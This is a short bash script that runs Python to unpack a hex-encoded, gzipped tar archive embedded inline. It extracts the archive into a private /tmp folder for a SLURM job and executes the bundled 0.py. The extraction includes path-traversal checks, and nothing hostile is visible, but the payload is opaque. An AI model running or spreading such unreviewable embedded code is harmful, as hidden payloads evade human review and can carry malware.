#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d8fdb201086f7ec5f8172b12d4504fc11c759e5d87b0f6d2fd56a85f138219b600b4877d3aaffbd6047abb4957adbdd569de7608ccdbc03330c30bab7bdbe79519867c9d8d8b2df5b96e7e5f3fbf47d5955ec86b0979dd6c4c93a61bccbd7f0f517f26de6fa07d0b33599355d5d88aaae96a2827a3627b3419c0fbd68efed4e64e5320c29b9acaabccab2a62c5ae8a096c0caba13252fa1658d58f10264912f5742349c358d6cf29a2d795189ae6b57255cab366707d68b9659bdca8a32fc39087de52c5b759d642d30e05eb06978c1db8e577596d545d65479c7cb7a55ca9cc38a15455d78192e4bd69672c9bc5f987d7febe0fe03303a9c5fdcc79feb9f735efc5aff459163fdbf06ea38f4c6117bb6f37011cc77c2ee0eaa99fba074ea005167fa2319840b1fc965f07bdf8dcc26348937a4c26cbf7ce677e9addc040d1acadb268959c46cbc5de2941af015efe0c925691a89c9345e0ca6df83740bd91f8f27addc79b1df9fe1a4b771ba909fe3f1648aef828cdb7e8d23612d78f79729d2e9a448c4243e1e275e9deee0a9555bb0ded566e3557e3ec5e2bbe851b91db9ac8ff603e844a44458e2d611e97a4380283d7688ea88ee1d01aac51168d828ce06eb24ee8ddc09d3deef385bc4e95af6da297d826b1b65838324255e32a6340eaae3ba27b9940e416e6d84b2403e89c309de19d39b24fea8ade8c22486938b532f396c7c2887783119de0ec112b4a3c787569964ead8cd077382393c29ebeefb87b197faa18f4639b804c7519f0023a41b2706535642424212438ea9d221c2099b5b6792d1a9ff3b6e81ab05d37dffbc158e42e9283c1293466fbd9711044110044110044110044110044110044110044110e47fe5073e1cfa9d00280000')
r=Path('/tmp')/('a'+j+'bf94a7976a7e9')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
